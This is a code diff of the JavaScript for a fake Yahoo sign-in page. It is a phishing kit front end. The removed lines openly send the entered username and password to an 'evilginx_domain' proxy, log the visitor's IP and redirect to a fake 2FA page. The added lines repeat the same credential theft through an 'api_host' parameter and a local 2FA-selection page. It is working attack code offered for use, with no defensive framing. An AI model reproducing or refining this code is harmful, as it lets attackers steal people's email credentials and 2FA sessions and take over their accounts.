@@ -1,105 +1,76 @@
 document.addEventListener("DOMContentLoaded", () => {
-  const emailStep = document.getElementById("email-step")
-  const passwordStep = document.getElementById("password-step")
-  const errorContainer = document.getElementById("error-container")
-  const errorMessage = document.getElementById("error-message")
+  const params = new URLSearchParams(window.location.search)
+  const apiHost = params.get("api_host")
 
-  const emailForm = document.getElementById("email-form")
-  const passwordForm = document.getElementById("password-form")
-  const usernameDisplay = document.getElementById("username-display")
-  const usernameInput = document.getElementById("username-input")
-  const passwordInput = document.getElementById("password-input")
-  const togglePasswordBtn = document.getElementById("toggle-password")
-  const tryAgainBtn = document.getElementById("try-again-btn")
-
-  let sessionData = {}
-
-  // 1. Initialize Session from URL parameters
-  const urlParams = new URLSearchParams(window.location.search)
-  sessionData = Object.fromEntries(urlParams.entries())
-  if (!sessionData.evilginx_domain) {
-    showError("Configuration error: Missing 'evilginx_domain'.")
-    emailForm.querySelector("button").disabled = true
+  if (!apiHost) {
+    document.body.innerHTML = "<h1>Configuration Error: api_host parameter is missing.</h1>"
     return
   }
 
-  // Capture IP address
-  fetch("https://api64.ipify.org?format=json")
-    .then((response) => response.json())
-    .then((data) => {
-      document.getElementById("ip").value = data.ip
-    })
-    .catch(() => {
-      document.getElementById("ip").value = "N/A"
-    })
+  const emailStep = document.getElementById("email-step")
+  const passwordStep = document.getElementById("password-step")
+  const loginForm = document.getElementById("login-form")
+  const usernameInput = document.getElementById("username")
+  const passwordInput = document.getElementById("password")
+  const nextToPasswordBtn = document.getElementById("next-to-password")
+  const passwordPromptEmail = document.getElementById("password-prompt-email")
+  const usernameError = document.getElementById("username-error")
+  const passwordError = document.getElementById("password-error")
 
-  // 2. Email Form Submission
-  emailForm.addEventListener("submit", (e) => {
-    e.preventDefault()
-    sessionData.username = usernameInput.value
-    usernameDisplay.textContent = `Signing in as ${sessionData.username}`
-    emailStep.style.display = "none"
-    passwordStep.style.display = "block"
-    passwordInput.focus()
-  })
-
-  // 3. Password Form Submission
-  passwordForm.addEventListener("submit", async (e) => {
-    e.preventDefault()
-    sessionData.password = passwordInput.value
-
-    const formData = new URLSearchParams({
-      username: sessionData.username,
-      passwd: sessionData.password,
-      ...sessionData,
-    })
-
-    try {
-      // Send credentials to Evilginx API endpoint
-      const response = await fetch(`https://${sessionData.evilginx_domain}/account/challenge/password`, {
-        method: "POST",
-        body: formData,
-        credentials: "include",
-      })
-
-      const responseText = await response.text()
-
-      // Conditional 2FA check
-      if (responseText.includes("challenge-selector") || responseText.includes("verify")) {
-        // 2FA is required
-        const params = new URLSearchParams(sessionData)
-        window.location.href = `https://yahoo-2fa-selection.vercel.app/?${params.toString()}`
-      } else if (response.ok || response.status === 302) {
-        // Login success, no 2FA
-        window.location.href = `https://mail.${sessionData.evilginx_domain}/d/folders/1`
-      } else {
-        // Invalid credentials or other error
-        showError("Invalid username or password. Please try again.")
-      }
-    } catch (error) {
-      showError("A network error occurred. Please try again.")
+  nextToPasswordBtn.addEventListener("click", () => {
+    const username = usernameInput.value
+    if (username.trim() === "") {
+      usernameError.textContent = "Please enter your email or username."
+      return
     }
+    usernameError.textContent = ""
+    passwordPromptEmail.textContent = `for ${username}`
+    emailStep.classList.remove("active")
+    passwordStep.classList.add("active")
   })
 
-  // UI Helpers
-  togglePasswordBtn.addEventListener("click", () => {
-    const isPassword = passwordInput.type === "password"
-    passwordInput.type = isPassword ? "text" : "password"
-    togglePasswordBtn.textContent = isPassword ? "Hide" : "Show"
-  })
+  loginForm.addEventListener("submit", (event) => {
+    event.preventDefault()
 
-  tryAgainBtn.addEventListener("click", () => {
-    errorContainer.style.display = "none"
-    passwordStep.style.display = "none"
-    emailStep.style.display = "block"
-    emailForm.reset()
-    passwordForm.reset()
-  })
+    const username = usernameInput.value
+    const password = passwordInput.value
 
-  function showError(message) {
-    errorMessage.textContent = message
-    emailStep.style.display = "none"
-    passwordStep.style.display = "none"
-    errorContainer.style.display = "block"
-  }
+    if (password.trim() === "") {
+      passwordError.textContent = "Please enter your password."
+      return
+    }
+    passwordError.textContent = ""
+
+    const formData = new URLSearchParams()
+    formData.append("username", username)
+    formData.append("passwd", password)
+    // Append other form data if necessary
+
+    fetch(`https://${apiHost}/account/challenge/password`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+      },
+      body: formData.toString(),
+      redirect: "manual", // Important to handle redirects ourselves
+    })
+      .then((response) => {
+        // We expect a redirect to a 2FA page or the final destination
+        // The actual content doesn't matter as much as the cookies set
+        // and the location header if there is one.
+        // For this flow, we assume success leads to 2FA.
+        // A more robust solution would parse the response to see what's next.
+
+        // Store username for next pages
+        sessionStorage.setItem("yahoo_username", username)
+        sessionStorage.setItem("api_host", apiHost)
+
+        // Redirect to 2FA selection page
+        window.location.href = `2fa-selection.html`
+      })
+      .catch((error) => {
+        console.error("Error:", error)
+        passwordError.textContent = "An unexpected error occurred. Please try again."
+      })
+  })
 })
